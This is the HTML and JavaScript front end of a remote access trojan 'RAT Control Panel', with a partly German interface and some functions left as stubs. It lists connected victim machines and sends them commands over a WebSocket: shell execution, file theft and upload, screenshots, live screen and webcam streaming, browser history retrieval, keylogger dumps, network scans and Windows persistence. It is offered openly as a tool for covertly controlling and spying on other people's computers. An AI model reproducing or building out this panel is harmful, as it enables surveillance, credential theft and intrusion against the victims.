<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <title>RAT Control Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #3b82f6;
      --secondary: #10b981;
      --danger: #ef4444;
      --warning: #f59e0b;
      --dark: #1f2937;
      --darker: #111827;
    }
    
    body {
      background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }
    
    .glass-effect {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }

    #client-list > div {
      word-break: break-all;
    }
    
    .client-card {
      transition: all 0.3s ease;
    }
    
    .client-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }
    
    .client-card.selected {
      border-color: var(--primary);
      box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
    }
    
    .status-dot {
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    
    .command-input {
      background: rgba(31, 41, 55, 0.8);
      border: 1px solid rgba(75, 85, 99, 0.25);
    }
    
    .command-input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
    }
    
    .output-area {
      background: rgba(17, 24, 39, 0.9);
      font-family: 'Monaco', 'Menlo', monospace;
    }
    
    .suggestion-item {
      transition: background-color 0.2s ease;
    }
    
    .suggestion-item:hover,
    .suggestion-item.selected {
      background-color: rgba(59, 130, 246, 0.2);
    }
    
    .webcam-container, .screen-container {
      width: 100%;
      max-height: 70vh;
    }
    
    .notification {
      animation: slideInRight 0.25s ease-out;
    }
    
    @keyframes slideInRight {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
    
    .notifications-container {
      position: fixed;
      top: 80px;
      right: 20px;
      z-index: 999;
    }
    
    .scrollbar-thin {
      scrollbar-width: thin;
      scrollbar-color: rgba(156, 163, 175, 0.5) transparent;
    }
    
    .scrollbar-thin::-webkit-scrollbar {
      width: 6px;
    }
    
    .scrollbar-thin::-webkit-scrollbar-track {
      background: transparent;
    }
    
    .scrollbar-thin::-webkit-scrollbar-thumb {
      background-color: rgba(156, 163, 175, 0.5);
      border-radius: 3px;
    }

    #server-stats-content > div {
      overflow: hidden;
    }

    .stat-card-wrapper {
      display: flex;
      flex-direction: column;
    }

    .stat-card-title {
      font-size: 0.8rem;
    }

    .stat-card-value {
      font-size: 1.2rem;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
  </style>
</head>
<body class="text-gray-100 min-h-screen">
  <!-- Main Application -->
  <div id="main-app" class="min-h-screen flex">
    <!-- Sidebar - Client List -->
    <div class="w-80 bg-gray-800 bg-opacity-50 p-6 overflow-y-auto scrollbar-thin">
      <div class="mb-6">
        <h2 class="text-xl font-bold text-white mb-4 flex items-center">
          <i class="fas fa-desktop mr-3 text-blue-400"></i>
          Connected Clients
          <span id="client-count" class="ml-auto bg-blue-600 text-white text-xs px-2 py-1 rounded-full">0</span>
        </h2>
        
        <!-- Client Actions -->
        <div class="flex gap-2 mb-4">
          <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
            <i class="fas fa-sync-alt mr-2"></i>Refresh
          </button>
          <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
            <i class="fas fa-check-double mr-2"></i>All
          </button>
        </div>
      </div>
      
      <!-- Client List -->
      <div id="client-list" class="space-y-3">
        <div class="text-center text-gray-400 py-8">
          <i class="fas fa-satellite-dish text-3xl mb-3"></i>
          <p>No clients connected</p>
          <p class="text-sm">Waiting for connections...</p>
        </div>
      </div>
    </div>

    <!-- Main Panel -->
    <div class="flex-1 flex flex-col">
      <!-- Header -->
      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700 flex items-center justify-between">
        <div>
          <h1 class="text-2xl font-bold text-white">RAT Control Panel</h1>
          <p class="text-gray-300 text-sm">Selected Clients: <span id="selected-count">0</span></p>
        </div>
        <div class="flex items-center gap-4">
          <div id="connection-indicator" class="mr-4">
            <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
              <i class="fas fa-wifi mr-2"></i>Connecting...
            </div>
          </div>
          <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
            <i class="fas fa-chart-bar mr-2"></i>Server Stats
          </button>
          <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
            <i class="fas fa-trash mr-2"></i>Clear
          </button>
          <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
            <i class="fas fa-download mr-2"></i>Export
          </button>
        </div>
      </div>

      <!-- Command Input Section -->
      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
        <div class="flex gap-3 relative">
          <div class="flex-1 relative">
            <input type="text" id="command-input" placeholder="Enter command... (/ for suggestions)"
                   class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
            
            <!-- Command Suggestions -->
            <div id="command-suggestions" class="absolute top-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mt-1 max-h-64 overflow-y-auto z-10 hidden">
              <!-- Suggestions will be populated by JavaScript -->
            </div>
          </div>
          
          <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium transition duration-200">
            <i class="fas fa-paper-plane mr-2"></i>Send
          </button>
          
          <input type="file" id="file-upload" class="hidden" multiple>
          <button id="upload-btn" class="bg-green-600 hover:bg-green-700 text-white px-4 py-3 rounded-lg transition duration-200">
            <i class="fas fa-upload"></i>
          </button>
        </div>
        
        <!-- Quick Actions -->
        <div class="flex gap-2 mt-3 flex-wrap">
          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/systeminfo">
            <i class="fas fa-info-circle mr-1"></i>System Info
          </button>
          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenshot">
            <i class="fas fa-camera mr-1"></i>Screenshot
          </button>
          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
            <i class="fas fa-folder mr-1"></i>List Files
          </button>
          <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ps">
            <i class="fas fa-tasks mr-1"></i>Processes
          </button>
          <button class="quick-action bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_info">
            <i class="fas fa-network-wired mr-1"></i>Network Info
          </button>
          <button class="quick-action bg-cyan-600 hover:bg-cyan-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_scan">
            <i class="fas fa-search-location mr-1"></i>Scan Network
          </button>
          <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
            <i class="fas fa-desktop mr-1"></i>Screen Stream
          </button>
          <button class="quick-action bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/webcam_start">
            <i class="fas fa-video mr-1"></i>Webcam
          </button>
          <button class="quick-action bg-orange-600 hover:bg-orange-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/history">
            <i class="fas fa-history mr-1"></i>Browser History
          </button>
        </div>
      </div>

      <!-- Output and Media Section -->
      <div class="flex-1 flex flex-col lg:flex-row">
        <!-- Output Area -->
        <div class="flex-1 flex flex-col p-4">
          <div class="flex items-center justify-between mb-3">
            <h3 class="text-lg font-semibold text-white">Output</h3>
            <button id="copy-output" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm transition duration-100">
              <i class="fas fa-copy mr-2"></i>Copy
            </button>
          </div>
          
          <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed">
            <div class="text-gray-400 text-center py-5">
              <i class="fas fa-terminal text-3xl mb-3"></i>
              <p>Ready for commands...</p>
              <p class="text-xs mt-2">Use / for command suggestions</p>
            </div>
          </div>
        </div>

        <!-- Media Area (Screenshots, Webcam, Screen Sharing) -->
        <div class="w-full lg:w-96 p-4">
          <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 h-full">
            <h3 class="text-lg font-semibold text-white mb-3">Live Media</h3>
            
            <!-- Screenshot Display -->
            <div id="screenshot-container" class="hidden mb-4">
              <div class="flex items-center justify-between mb-2">
                <span class="text-sm text-gray-300">Screenshot</span>
                <button id="download-screenshot" class="text-blue-400 hover:text-blue-300 text-sm">
                  <i class="fas fa-download"></i>
                </button>
              </div>
              <img id="screenshot-img" class="w-full rounded-lg border border-gray-600" alt="Screenshot">
            </div>
            
            <!-- Screen Stream -->
            <div id="screen-stream-container" class="hidden mb-4">
              <div class="flex items-center justify-between mb-2">
                <span class="text-sm text-gray-300">Screen Stream</span>
                <button id="stop-screen-stream" class="text-red-400 hover:text-red-300 text-sm">
                  <i class="fas fa-stop-circle mr-1"></i>Stop
                </button>
              </div>
              <canvas id="screen-canvas" class="w-full rounded-lg border border-gray-600 screen-container"></canvas>
              <div id="screen-status" class="text-xs text-gray-400 mt-2 text-center"></div>
            </div>
            
            <!-- Webcam Stream -->
            <div id="webcam-container" class="hidden mb-4">
              <div class="flex items-center justify-between mb-2">
                <span class="text-sm text-gray-300">Webcam Stream</span>
                <button id="stop-webcam" class="text-red-400 hover:text-red-300 text-sm">
                  <i class="fas fa-stop-circle mr-1"></i>Stop
                </button>
              </div>
              <canvas id="webcam-canvas" class="w-full rounded-lg border border-gray-600 webcam-container"></canvas>
              <div id="webcam-status" class="text-xs text-gray-400 mt-2 text-center"></div>
            </div>
            
            <!-- Placeholder when no media -->
            <div id="media-placeholder" class="text-center text-gray-400 py-8">
              <i class="fas fa-image text-3xl mb-3"></i>
              <p>No live media</p>
              <p class="text-xs">Screenshots and streams appear here</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Server Stats Modal -->
  <div id="server-stats-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
    <div class="glass-effect rounded-2xl p-6 w-full max-w-4xl mx-4 max-h-[90vh] overflow-y-auto">
      <div class="flex items-center justify-between mb-6">
        <h2 class="text-2xl font-bold text-white">Server Statistics</h2>
        <button id="close-stats-modal" class="text-gray-400 hover:text-white text-2xl">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div id="server-stats-content" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
        <!-- Stats content will be populated by JavaScript -->
      </div>
      
      <div class="mt-6 text-center">
        <button id="refresh-stats" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition duration-100">
          <i class="fas fa-sync-alt mr-2"></i>Refresh
        </button>
      </div>
    </div>
  </div>

  <!-- Server Stats Modal -->
  <div id="server-stats-loading" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
    <div class="text-white">Loading server statistics...</div>
  </div>

  <!-- Notifications Container -->
  <div id="notifications" class="notifications-container space-y-2"></div>

  <script>
    // Global Variables
    let ws = null;
    let selectedClients = new Set();
    let lastClientList = [];
    let commandHistory = [];
    let historyIndex = -1;
    let reconnectAttempts = 0;
    let maxReconnectAttempts = 5;

    const commands = [
        { cmd: '/help', desc: 'Zeigt diese Hilfe an.' },
        { cmd: '/exec <befehl>', desc: 'Führt einen Shell-Befehl aus.' },
        { cmd: '/screenshot', desc: 'Nimmt einen Screenshot auf.' },
        { cmd: '/download <pfad>', desc: 'Lädt eine Datei vom Client herunter.' },
        { cmd: '/upload', desc: 'Lädt eine Datei auf den Client hoch.' },
        { cmd: '/ls <pfad>', desc: 'Listet den Inhalt eines Verzeichnisses auf.' },
        { cmd: '/cd <pfad>', desc: 'Wechselt das Arbeitsverzeichnis.' },
        { cmd: '/rm <pfad>', desc: 'Löscht eine Datei oder ein Verzeichnis.' },
        { cmd: '/mkdir <pfad>', desc: 'Erstellt ein neues Verzeichnis.' },
        { cmd: '/systeminfo', desc: 'Zeigt detaillierte Systeminformationen an.' },
        { cmd: '/network_info', desc: 'Zeigt Netzwerkinformationen an.' },
        { cmd: '/history', desc: 'Ruft den Browserverlauf ab.' },
        { cmd: '/ps', desc: 'Listet laufende Prozesse auf.' },
        { cmd: '/kill <pid>', desc: 'Beendet einen Prozess.' },
        { cmd: '/msgbox <text>', desc: 'Zeigt eine Nachrichtenbox an.' },
        { cmd: '/network_scan <cidr>', desc: 'Scannt das Netzwerk nach Hosts.' },
        { cmd: '/webcam_list', desc: 'Listet verfügbare Webcams auf.' },
        { cmd: '/webcam_start <index>', desc: 'Startet den Webcam-Stream.' },
        { cmd: '/webcam_stop', desc: 'Stoppt den Webcam-Stream.' },
        { cmd: '/screenstream_start', desc: 'Startet den Bildschirm-Stream.' },
        { cmd: '/screenstream_stop', desc: 'Stoppt den Bildschirm-Stream.' },
        { cmd: '/keylogger <bytes>', desc: 'Ruft die letzten Keylogger-Daten ab.' },
        { cmd: '/persist', desc: 'Aktiviert die Persistenz auf dem Client (Windows).'},
        { cmd: '/unpersist', desc: 'Deaktiviert die Persistenz auf dem Client (Windows).'},
        { cmd: '/uninstall', desc: 'Deinstalliert den Client (Windows).'}
    ];

    // DOM Elements
    const mainApp = document.getElementById('main-app');
    const connectionStatus = document.getElementById('connection-status');
    const clientList = document.getElementById('client-list');
    const clientCount = document.getElementById('client-count');
    const selectedCount = document.getElementById('selected-count');
    const commandInput = document.getElementById('command-input');
    const commandSuggestions = document.getElementById('command-suggestions');
    const sendCommandBtn = document.getElementById('send-command');
    const outputArea = document.getElementById('output-area');
    const fileUpload = document.getElementById('file-upload');
    const uploadBtn = document.getElementById('upload-btn');
    const screenshotContainer = document.getElementById('screenshot-container');
    const screenshotImg = document.getElementById('screenshot-img');
    const screenStreamContainer = document.getElementById('screen-stream-container');
    const screenCanvas = document.getElementById('screen-canvas');
    const screenStatus = document.getElementById('screen-status');
    const webcamContainer = document.getElementById('webcam-container');
    const webcamCanvas = document.getElementById('webcam-canvas');
    const webcamStatus = document.getElementById('webcam-status');
    const mediaPlaceholder = document.getElementById('media-placeholder');
    const serverStatsBtn = document.getElementById('server-stats-btn');
    const serverStatsModal = document.getElementById('server-stats-modal');
    const closeStatsModal = document.getElementById('close-stats-modal');
    const serverStatsLoading = document.getElementById('server-stats-loading');
    const serverStatsContent = document.getElementById('server-stats-content');
    const refreshStats = document.getElementById('refresh-stats');

    // Utility Functions
    function showNotification(message, type = 'info', duration = 3000) {
      const notification = document.createElement('div');
      const colors = {
        success: 'bg-green-500',
        error: 'bg-red-500',
        warning: 'bg-yellow-500',
        info: 'bg-blue-500'
      };
      
      notification.className = `notification ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg max-w-sm`;
      notification.innerHTML = `
        <div class="flex items-center justify-between">
          <span>${message}</span>
          <button onclick="this.parentElement.parentElement.remove()" class="ml-3 text-white hover:text-gray-200">
            <i class="fas fa-times"></i>
          </button>
        </div>
      `;
      
      document.getElementById('notifications').appendChild(notification);
      
      if (duration > 0) {
        setTimeout(() => notification.remove(), duration);
      }
    }

    function updateConnectionStatus(status, message) {
      const statusElement = connectionStatus;
      statusElement.className = 'px-3 py-2 rounded-full text-sm font-medium';
      
      switch (status) {
        case 'connected':
          statusElement.className += ' bg-green-500 text-green-900';
          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Connected';
          break;
        case 'connecting':
          statusElement.className += ' bg-yellow-500 text-yellow-900';
          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Connecting...';
          break;
        case 'disconnected':
          statusElement.className += ' bg-red-500 text-red-900';
          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected';
          break;
        case 'error':
          statusElement.className += ' bg-red-600 text-red-100';
          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Error';
          break;
      }
    }

    function logOutput(message, type = 'info') {
      const timestamp = new Date().toLocaleTimeString();
      const logEntry = document.createElement('div');
      logEntry.className = 'mb-2 p-2 rounded';
      
      const colors = {
        info: 'text-gray-300',
        success: 'text-green-400',
        error: 'text-red-400',
        warning: 'text-yellow-400',
        command: 'text-blue-400'
      };
      
      logEntry.className += ` ${colors[type]}`;
      logEntry.innerHTML = `<span class="text-gray-500 text-xs">[${timestamp}]</span> ${message}`;
      
      outputArea.appendChild(logEntry);
      outputArea.scrollTop = outputArea.scrollHeight;
      
      // Remove placeholder
      const placeholder = outputArea.querySelector('.text-center');
      if (placeholder) placeholder.remove();
    }

    // WebSocket Connection
    function connectWebSocket() {
      const token = localStorage.getItem('rat_token');
      if (!token) {
        const errorMessage = encodeURIComponent('Kein Authentifizierungstoken gefunden. Bitte anmelden.');
        window.location.href = `/login?error=${errorMessage}`;
        return;
      }
      
      updateConnectionStatus('connecting');
      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
      const wsUrl = `${protocol}//${location.host}/ws?token=${encodeURIComponent(token)}`;
      
      ws = new WebSocket(wsUrl);
      
      ws.onopen = function() {
        updateConnectionStatus('connected');
        showNotification('WebSocket connection established', 'success');
        reconnectAttempts = 0;
        requestClientList();
      };
      
      ws.onmessage = function(event) {
        try {
          let data;
          if (typeof event.data === 'string') {
            data = JSON.parse(event.data);
          } else {
            handleBinaryData(event.data);
            return;
          }
          handleWebSocketMessage(data);
        } catch (error) {
          console.error('Error parsing WebSocket message:', error);
          logOutput(`Fehler beim Verarbeiten der Nachricht: ${error.message}`, 'error');
        }
      };
      
      ws.onclose = function(event) {
        updateConnectionStatus('disconnected');
        if (event.code === 4401) {
          localStorage.removeItem('rat_token');
          const errorMessage = encodeURIComponent('Sitzung abgelaufen oder ungültig. Bitte erneut anmelden.');
          window.location.href = `/login?error=${errorMessage}`;
        } else if (reconnectAttempts < maxReconnectAttempts) {
          reconnectAttempts++;
          showNotification(`Connection lost. Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
          setTimeout(connectWebSocket, 3000);
        } else {
          showNotification('Maximum reconnection attempts reached', 'error');
        }
      };
      
      ws.onerror = function(error) {
        console.error('WebSocket Error:', error);
        updateConnectionStatus('error');
        showNotification('WebSocket Verbindungsfehler', 'error');
      };
    }

    function handleWebSocketMessage(data) {
      switch (data.type) {
        case 'client_list':
          updateClientList(data.clients || []);
          break;
        case 'client_connected':
          showNotification(`New client connected: ${data.client.hostname}`, 'success');
          requestClientList();
          break;
        case 'client_disconnected':
          showNotification(`Client disconnected: ${data.client_id}`, 'warning');
          selectedClients.delete(data.client_id);
          updateSelectedCount();
          requestClientList();
          break;
        case 'command_output':
          logOutput(`<pre>${data.output}</pre>`, 'info');
          break;
        case 'screenshot':
          displayScreenshot(data.data);
          break;
        case 'screen_frame':
          displayScreenFrame(data.data);
          break;
        case 'webcam_frame':
          displayWebcamFrame(data);
          break;
        case 'file_download':
          downloadFile(data.filename, data.data);
          break;
        case 'error':
          logOutput(`Fehler: ${data.message}`, 'error');
          showNotification(data.message, 'error');
          break;
        default:
          console.log('Unhandled message type:', data.type, data);
      }
    }

    function handleBinaryData(data) {
      const canvas = webcamCanvas;
      const ctx = canvas.getContext('2d');
      const blob = new Blob([data], { type: 'image/jpeg' });
      const url = URL.createObjectURL(blob);
      const img = new Image();
      img.onload = function() {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        webcamContainer.classList.remove('hidden');
        mediaPlaceholder.classList.add('hidden');
      };
      img.src = url;
    }

    // Client Management
    function updateClientList(clients) {
      clientList.innerHTML = '';
      clientCount.textContent = clients.length;
      lastClientList = clients;
      
      if (clients.length === 0) {
        clientList.innerHTML = `<div class="text-center text-gray-400 py-8"><i class="fas fa-satellite-dish text-3xl mb-3"></i><p>No clients connected</p></div>`;
        return;
      }
      
      clients.forEach(client => {
        const clientElement = createClientElement(client);
        clientList.appendChild(clientElement);
      });
      updateSelectedCount();
    }

    function createClientElement(client) {
      const div = document.createElement('div');
      div.className = 'client-card glass-effect p-4 rounded-lg cursor-pointer';
      div.dataset.clientId = client.id;
      const osIcon = getOSIcon(client.os);
      const isSelected = selectedClients.has(client.id);
      if (isSelected) div.classList.add('selected');
      
      div.innerHTML = `
        <div class="flex items-center justify-between mb-2">
          <div class="flex items-center"><div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div><i class="${osIcon} text-lg mr-2"></i><span class="font-medium text-white">${client.hostname}</span></div>
          ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
        </div>
        <div class="text-sm text-gray-300"><div class="flex justify-between"><span>IP:</span><span>${client.ip}</span></div><div class="flex justify-between"><span>OS:</span><span class="text-xs">${client.os}</span></div></div>`;
      
      div.addEventListener('click', () => {
        toggleClientSelection(client.id);
        updateClientVisuals();
      });
      return div;
    }

    function getOSIcon(os) {
      if (!os) return 'fas fa-desktop';
      const osLower = os.toLowerCase();
      if (osLower.includes('windows')) return 'fab fa-windows';
      if (osLower.includes('linux')) return 'fab fa-linux';
      if (osLower.includes('mac')) return 'fab fa-apple';
      return 'fas fa-desktop';
    }

    function toggleClientSelection(clientId) {
      if (selectedClients.has(clientId)) {
        selectedClients.delete(clientId);
      } else {
        selectedClients.add(clientId);
      }
      updateSelectedCount();
    }

    function updateSelectedCount() {
      selectedCount.textContent = selectedClients.size;
    }

    function updateClientVisuals() {
      document.querySelectorAll('.client-card').forEach(card => {
        const clientId = card.dataset.clientId;
        const checkIcon = card.querySelector('.fa-check-circle');
        if (selectedClients.has(clientId)) {
          card.classList.add('selected');
          if (!checkIcon) card.querySelector('.flex.items-center.justify-between').innerHTML += '<i class="fas fa-check-circle text-blue-400"></i>';
        } else {
          card.classList.remove('selected');
          if (checkIcon) checkIcon.remove();
        }
      });
    }

    function requestClientList() {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'get_clients' }));
      }
    }

    // Command Handling
    function setupCommandInput() {
      commandInput.addEventListener('input', handleCommandInput);
      commandInput.addEventListener('keydown', handleCommandKeydown);
    }

    function handleCommandInput() {
      const value = commandInput.value;
      if (value.startsWith('/')) {
        showCommandSuggestions();
      } else {
        hideCommandSuggestions();
      }
    }

    function handleCommandKeydown(e) {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendCommandToClients();
      }
    }

    function showCommandSuggestions() {
        const value = commandInput.value.toLowerCase();
        const filtered = commands.filter(cmd => cmd.cmd.toLowerCase().startsWith(value));
        commandSuggestions.innerHTML = '';
        if (filtered.length > 0) {
            filtered.forEach(cmd => {
                const div = document.createElement('div');
                div.className = 'suggestion-item px-4 py-2 cursor-pointer hover:bg-blue-700';
                div.innerHTML = `<span class="font-medium text-blue-400">${cmd.cmd}</span> <span class="text-sm text-gray-400">${cmd.desc}</span>`;
                div.onclick = () => {
                    commandInput.value = cmd.cmd.split(' ')[0] + ' ';
                    hideCommandSuggestions();
                    commandInput.focus();
                };
                commandSuggestions.appendChild(div);
            });
            commandSuggestions.classList.remove('hidden');
        } else {
            hideCommandSuggestions();
        }
    }

    function hideCommandSuggestions() {
      commandSuggestions.classList.add('hidden');
    }

    function sendCommandToClients() {
      const command = commandInput.value.trim();
      if (!command) return;

      if (command === '/help') {
          const helpText = commands.map(c => `${c.cmd.padEnd(25, ' ')} - ${c.desc}`).join('\n');
          logOutput(`<pre>${helpText}</pre>`, 'info');
          commandInput.value = '';
          return;
      }

      if (selectedClients.size === 0) {
        showNotification('Please select at least one client.', 'warning');
        return;
      }
      
      const parsedCommand = parseCommand(command);
      const payload = { ...parsedCommand, target_ids: Array.from(selectedClients) };
      
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(payload));
      }
      
      logOutput(`Command sent: ${command}`, 'command');
      commandInput.value = '';
      hideCommandSuggestions();
    }

    function parseCommand(command) {
        const parts = command.trim().split(/\s+/);
        const action = parts[0].startsWith('/') ? parts[0].substring(1) : 'exec';
        let args = parts.slice(1);

        const result = { action };
        
        if (['exec', 'download', 'cd', 'rm', 'mkdir', 'kill', 'msgbox', 'network_scan', 'webcam_start', 'keylogger'].includes(action)) {
            if (action === 'exec') {
                result.command = args.join(' ');
            } else {
                 result[action === 'kill' ? 'pid' : 'path'] = args[0];
                 if(action === 'msgbox') result.text = args.join(' ');
                 if(action === 'network_scan') result.range = args[0];
                 if(action === 'webcam_start') result.index = args[0];
                 if(action === 'keylogger') result.count = args[0];
            }
        }
        return result;
    }

    // Server Stats, Media Handling, etc. (gekürzt für Übersicht)
    async function fetchWithAuth(url, options = {}) {
      const token = localStorage.getItem('rat_token');
      if (!token) { window.location.href = '/login?error=token_missing'; return; }
      const headers = { ...options.headers, 'Authorization': `Bearer ${token}` };
      const response = await fetch(url, { ...options, headers });
      if (response.status === 401) { localStorage.removeItem('rat_token'); window.location.href = '/login?error=token_invalid'; }
      return response;
    }
    async function loadServerStats() { /* ... */ }
    function displayServerStats(stats) { /* ... */ }
    function displayScreenshot(base64Data) { /* ... */ }
    function displayScreenFrame(base64Data) { /* ... */ }
    function displayWebcamFrame(data) { /* ... */ }
    function downloadFile(filename, base64Data) { /* ... */ }
    function setupFileUpload() { /* ... */ }
    function handleFileUpload(event) { /* ... */ }

    // Event Listeners
    function setupEventListeners() {
      sendCommandBtn.addEventListener('click', sendCommandToClients);
      document.querySelectorAll('.quick-action').forEach(btn => {
        btn.addEventListener('click', () => {
          commandInput.value = btn.dataset.command + ' ';
          commandInput.focus();
        });
      });
      document.getElementById('refresh-clients').addEventListener('click', requestClientList);
      document.getElementById('select-all-clients').addEventListener('click', () => {
        const allClientIds = Array.from(document.querySelectorAll('.client-card')).map(card => card.dataset.clientId);
        selectedClients.clear();
        allClientIds.forEach(id => selectedClients.add(id));
        updateSelectedCount();
        updateClientVisuals();
      });
      // ... weitere Event Listeners
      setupCommandInput();
      setupFileUpload();
    }

    // Initialize Application
    function init() {
      setupEventListeners();
      const token = localStorage.getItem('rat_token');
      if (token) {
        mainApp.classList.remove('hidden');
        connectWebSocket();
      } else {
        const errorMessage = encodeURIComponent('Bitte melden Sie sich an.');
        window.location.href = `/login?error=${errorMessage}`;
      }
    }

    init();
  </script>
</body>
</html>